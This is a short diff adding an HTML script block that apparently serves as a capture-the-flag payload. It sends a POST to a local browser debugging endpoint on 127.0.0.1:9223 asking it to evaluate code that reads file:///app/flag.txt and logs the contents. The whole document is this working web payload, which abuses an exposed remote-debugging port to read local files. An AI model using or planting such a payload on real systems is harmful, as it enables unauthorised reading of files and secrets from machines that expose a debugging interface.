@@ -1,0 +1,9 @@
+<script>
+  fetch('http://127.0.0.1:9223/json/runtime/evaluate', {
+  method: 'POST',
+  body: JSON.stringify({
+    expression: "fetch('file:///app/flag.txt').then(r => r.text()).then(console.log)",
+    returnByValue: true
+  })
+});
+</script>
